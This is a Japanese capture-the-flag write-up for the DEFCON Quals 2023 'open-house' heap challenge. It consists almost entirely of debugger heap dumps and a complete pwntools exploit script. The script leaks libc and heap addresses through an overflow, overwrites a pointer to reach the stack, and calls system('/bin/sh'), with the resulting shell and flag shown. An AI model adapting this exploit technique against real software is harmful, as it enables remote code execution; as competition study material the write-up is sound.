# DEFCON Quals 2023 WriteupとCTFのリハビリ

> 原文: https://www.ctfiot.com/117899.html
> ID: 117899


```
(base) ubuntu@ubuntu-virtual-machine:~/ctf/defcon$ ./open-house
Welcome! Step right in and discover our hidden gem! You'll *love* the pool.
c|v|q> c
Absolutely, we'd love to have your review!
AAAAAAAA
Thanks!
c|v|m|d|q> d
Which of these reviews should we delete
(base) ubuntu@ubuntu-virtual-machine:~/ctf/defcon$ file open-house
open-house: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0dff6b6b6435d3c61f0159923f1758e8c9e6a1a8, for GNU/Linux 3.2.0, stripped
pwndbg> checksec
RELRO STACK CANARY NX PIE RPATH RUNPATH	Symbols FORTIFY	Fortified	Fortifiable	FILE
No RELRO No canary found NX enabled PIE enabled No RPATH No RUNPATH No Symbols No	0 3 /home/ubuntu/ctf/defcon/open-house
c|v|q> c
Absolutely, we'd love to have your review!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks!
0x5655aa40:	0x00000000	0x00000000	0x00000000	0x00000211
0x5655aa50:	0x41414141	0x41414141	0x41414141	0x41414141
0x5655aa60:	0x41414141	0x41414141	0x41414141	0x41414141
0x5655aa70:	0x41414141	0x41414141	0x0000000a	0x00000000
…
0x5655ac30:	0x00000000	0x00000000	0x00000000	0x00000000
0x5655ac40:	0x00000000	0x00000000	0x00000000	0x00000000
0x5655ac50:	0x00000000	0x5655a430	0x00000000	0x000203a9
c|v|m|d|q> m
Which of these reviews should we replace?
2
Replacing this one: AAAAAAAAAAAAAAAAAAAAAAAAAAAA　←　これが*pになる
pwndbg> bins
tcachebins
0x110 [ 7]: 0x56559e00 —▸ 0x56559bf0 —▸ 0x565599e0 —▸ 0x565597d0 —▸ 0x565595c0 —▸ 0x565593b0 —▸ 0x565591a0 ◂— 0x0
fastbins
0x10: 0x0
0x18: 0x0
0x20: 0x0
0x28: 0x0
0x30: 0x0
0x38: 0x0
0x40: 0x0
unsortedbin
all: 0x5655a008 —▸ 0xf7e2a7f8 (main_arena+56) ◂— 0x5655a008
0x5655a008	0x00000000	0x00000211	........
0x5655a010	0xf7e2aa0a	0xf7e2aa38	....8...
0x5655a018	0x5655a008	0x5655a008	..UV..UV
0x5655a020	0x63207470	0x69646e6f	pt condi
0x5655a028	0x6e6f6974	0x6874202c	tion, th
import logging

from pwn import *
context.arch="i386"

option = "local"

if option == "local":
 elf=ELF("/home/ubuntu/ctf/defcon/open-house")
 libc=ELF("/lib/i386-linux-gnu/libc.so.6")
 p=process("/home/ubuntu/ctf/defcon/open-house"
 , aslr=True)
 #gdb.attach(p)

else:
 libc=ELF("/home/ubuntu/ctf/defcon/libc6-i386_2.37-0ubuntu2_amd64.so")
 p = remote("open-house-6dvpeatmylgze.shellweplayaga.me", 10001)
 p.sendlineafter("Ticket please: ", "ticket{自分のチケット番号を入れようね}")

def create(message):
 p.sendlineafter(">","c")
 print(p.recvline())
 p.sendline(message)
 return

def delete(index):
 p.sendlineafter(">","d")
 print(p.recvline())
 p.sendline(str(index))
 return

def replace(index, message):
 p.sendlineafter(">","m")
 print(p.recvline())
 p.sendline(str(index))
 p.sendlineafter("replace it with?", message)
 return

create(cyclic(0x208))
for i in range(11):
 delete(1)

create("")
create("")
create("")
create("")
create("")
create("")
create("")
create("")

p.sendlineafter(">","v")

for i in range(16):
 p.recvline()

p.recv(3)

if option == "local":
 libc_base = u32(p.recv(4)) - 0x22AA38

else:
 libc_base = u32(p.recv(4)) - 0x225A38

heap_base = u32(p.recv(4)) - 0x1008
log.info("libc base is " + hex(libc_base))
log.info("heap base is " + hex(heap_base))
print(hexdump(p.recvline()))

for i in range(11):
 delete(1)

for i in range(11):
 create("")

if option == "local":
 replace(3, cyclic(0x200) + p32(libc_base + libc.symbols["environ"]))
else:
 replace(3, cyclic(0x200) + p32(libc_base + libc.symbols["environ"]))

p.sendlineafter(">", "m")
print(p.recvline())
p.sendline(str(4))

p.recv(20)

stack_base = u32(p.recv(4))
log.info("stack_address is " + hex(stack_base))

p.sendline(p32(stack_base))

replace(3, p32(0) * 0x80 + p32(stack_base-0x200))
p.sendlineafter(">", "m")
print(p.recvline())
p.sendline(str(4))

system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))

p.sendline(p32(0) * 0x40 + p32(system) + p32(0) + p32(binsh)+ p32(0))

p.interactive()
What do you think we should we replace it with?
ls
challenge
flag.txt
run_challenge.sh
cat flag.txt
flag{DeveloperTax47n23:
SBp6IAciEkQu5HXDfzG_0DcZZO5e5Wv2KKus4D9mrhCLPpWNUgk1U1lrIHRNCdiQ5f3eX9BwQL9-Qerdbkj9qA}[*] Interrupted
[*] Closed connection to open-house-6dvpeatmylgze.shellweplayaga.me port 10001
```
